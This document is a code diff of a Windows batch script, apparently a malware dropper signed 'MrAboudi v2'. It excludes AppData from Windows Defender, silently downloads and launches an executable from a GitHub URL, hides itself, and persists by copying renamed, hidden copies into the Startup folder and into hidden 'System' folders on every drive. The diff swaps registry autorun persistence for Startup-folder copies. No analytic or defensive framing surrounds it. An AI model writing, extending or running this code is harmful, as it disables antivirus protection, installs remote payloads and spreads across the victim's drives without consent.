@@ -19,7 +19,7 @@ if %errorlevel% NEQ 0 (
     exit /b
 )
 
-:: ==== Exclude AppData from Defender ====
+:: ==== Defender exclusion ====
 set "APPDATA_PATH=%USERPROFILE%\AppData"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 
@@ -29,26 +29,21 @@ set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/m
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
 
-:: ==== Self path & hidden startup ====
+:: ==== Self path & startup path ====
 set "SELF=%~f0"
-set "HIDEFOLDER=%APPDATA%\Roaming\System"
-set "HIDDEN_BAT=%HIDEFOLDER%\WinCheck.bat"
+set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+attrib +h +s "%STARTUP_FOLDER%" >nul 2>&1
 
-mkdir "%HIDEFOLDER%" >nul 2>&1
-copy "%SELF%" "%HIDDEN_BAT%" >nul
-attrib +h +s "%HIDEFOLDER%" >nul
-attrib +h +s "%HIDDEN_BAT%" >nul
-
-:: ==== Registry autorun (stealth startup) ====
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinCheckService" /t REG_SZ /d "\"%HIDDEN_BAT%\"" /f >nul
-
-:: ==== Loop through drives and replicate ====
+:: ==== Loop through drives ====
 for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist "%%L:\" (
         set "FOLDER=System %%L"
         set "DRIVE_FOLDER=%%L:\!FOLDER!"
         set "DRIVE_BAT=!DRIVE_FOLDER!\Java.bat"
+        set "STARTUP_NAME=Microsoft%%L.bat"
+        set "STARTUP_BAT=%STARTUP_FOLDER%\!STARTUP_NAME!"
 
+        :: Create hidden folder on drive
         mkdir "!DRIVE_FOLDER!" >nul 2>&1
         if exist "!DRIVE_FOLDER!" (
             copy "%SELF%" "!DRIVE_BAT!" >nul
@@ -57,10 +52,17 @@ for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
                 attrib +h +s "!DRIVE_BAT!"
             )
         )
+
+        :: Copy renamed version to Startup
+        copy "%SELF%" "!STARTUP_BAT!" >nul
+        if exist "!STARTUP_BAT!" (
+            attrib +h +s "!STARTUP_BAT!"
+        )
     )
 )
 
 exit
+
 
 :: By MrAboudi
 :: v2
